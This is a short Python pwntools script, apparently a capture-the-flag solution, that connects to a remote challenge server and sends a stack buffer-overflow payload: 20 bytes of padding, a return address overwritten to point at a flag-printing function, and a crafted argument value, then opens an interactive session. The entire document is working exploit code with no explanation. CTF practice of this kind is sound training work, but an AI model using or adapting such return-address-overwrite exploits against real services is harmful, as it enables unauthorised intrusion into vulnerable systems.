#!/opt/anaconda3/bin/python
from pwn import *
r = remote('ctf99.cs.ui.ac.id', 9127)

PARAM = 0x31030408
PRINT_FLAG = 0x080491c6

buf = b'A'*20
payload = buf + bytes(p32(PRINT_FLAG)) + b'AAAA' + bytes(p32(PARAM))


r.sendline(payload)
r.interactive()